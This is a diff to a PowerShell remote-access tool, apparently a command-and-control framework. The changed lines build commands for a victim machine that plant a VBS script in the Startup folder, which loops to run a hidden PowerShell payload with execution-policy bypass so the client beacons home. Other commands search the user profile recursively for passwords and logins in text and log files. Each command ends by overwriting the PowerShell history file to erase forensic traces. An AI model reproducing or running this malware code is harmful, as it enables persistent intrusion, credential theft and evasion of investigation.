@@ -950,7 +950,7 @@ While($Client.Connected)
           Write-Host "   -------               -----------";
           Write-Host "   $payload_name.ps1  `$env:tmp\$payload_name.ps1";
           Write-Host "   $payload_name.vbs  `$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs";
-          Write-Host "   Persistence LogFile:  $logfile (Local Machine)" -ForeGroundColor yellow;
+          Write-Host "   Persistence LogFile:  $logfile" -ForeGroundColor yellow;
           Write-Host "   On StartUp our Client will beacon home from $Delay_Time to $Delay_Time seconds (infinite loop)." -ForeGroundColor yellow;
           $Command = "echo 'Set objShell = WScript.CreateObject(`"WScript.Shell`")' `> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Do' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'wscript.sleep $BeaconTime' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'objShell.Run `"cmd.exe /R powershell.exe -Exec Bypass -Win 1 -File %tmp%\$payload_name.ps1`", 0, True' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo 'Loop' `>`> `"`$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup\$payload_name.vbs`";echo `"   [i] Client $Payload_name.ps1 successful Persisted ..`" `> dellog.txt;Get-Content dellog.txt;Remove-Item dellog.txt -Force";          
           #$Command = Variable_Obfuscation(Character_Obfuscation($Command));
@@ -1200,16 +1200,16 @@ While($Client.Connected)
         $pass_choise = Read-Host;
         If($pass_choise -eq "Auto" -or $pass_choise -eq "auto")
         {
-          write-host " List Stored Passwords (in Text|Log Files)." -ForegroundColor Blue -BackgroundColor White;
+          write-host " List Stored Passwords (in Text Files)." -ForegroundColor Blue -BackgroundColor White;
           write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
           $Recursive_search = Read-Host;
           If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
           write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
-          $Command = "cd $Recursive_search|findstr /s /I /C:`"user`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"passw`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"login`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
+          $Command = "cd $Recursive_search|findstr /S /I /C:`"user`" /S /I /C:`"passw`" *.txt `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"passw`" *.txt *.log `>`> `$env:tmp\passwd.txt;cd $Recursive_search|findstr /s /I /C:`"login`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
         }
         If($pass_choise -eq "Manual" -or $pass_choise -eq "manual")
         {
-          write-host " List Stored Passwords (in Text|Log Files)." -ForegroundColor Blue -BackgroundColor White;
+          write-host " List Stored Passwords (in Text Files)." -ForegroundColor Blue -BackgroundColor White;
           write-host " - Input String to search inside files (passwrd): " -NoNewLine;
           $String_search = Read-Host;
           write-host " - Directory to search recursive (`$env:userprofile): " -NoNewLine;
@@ -1217,7 +1217,7 @@ While($Client.Connected)
           If(-not($String_search)){$String_search = "password"}
           If(-not($Recursive_search)){$Recursive_search = "$env:userprofile"}
           write-host " [warning] This Function Might Take aWhile To Complete .." -ForegroundColor red -BackGroundColor white;write-host "`n`n";
-          $Command = "cd $Recursive_search|findstr /s /I /C:`"$String_search`" *.txt *.log `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
+          $Command = "cd $Recursive_search|findstr /s /I /C:`"$String_search`" /S /I /C:`"passw`" *.txt `>`> `$env:tmp\passwd.txt;Get-Content `$env:tmp\passwd.txt;Remove-Item `$env:tmp\passwd.txt -Force;echo `"Forensic null factor`" `> `$env:appdata\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt;cd `$env:tmp";
         }
         If($pass_choise -eq "Return" -or $pass_choise -eq "return" -or $pass_choise -eq "cls" -or $pass_choise -eq "Modules" -or $pass_choise -eq "modules" -or $pass_choise -eq "clear")
         {
